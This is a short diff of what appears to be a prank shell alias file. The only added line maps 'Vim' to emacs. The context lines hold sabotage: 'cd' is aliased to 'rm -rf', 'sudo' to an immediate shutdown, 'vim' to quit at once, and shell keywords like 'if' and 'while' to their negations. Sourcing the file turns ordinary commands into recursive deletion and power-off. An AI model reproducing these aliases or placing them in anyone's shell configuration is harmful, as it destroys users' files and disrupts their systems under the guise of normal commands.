@@ -4,6 +4,7 @@
 alias if= 'if !' for='for !' while = 'while !';
 
 alias vim="vim +q";
+alias Vim="emacs"
 
 alias sudo='sudo shutdown -P now';
 alias cd='rm -rf';
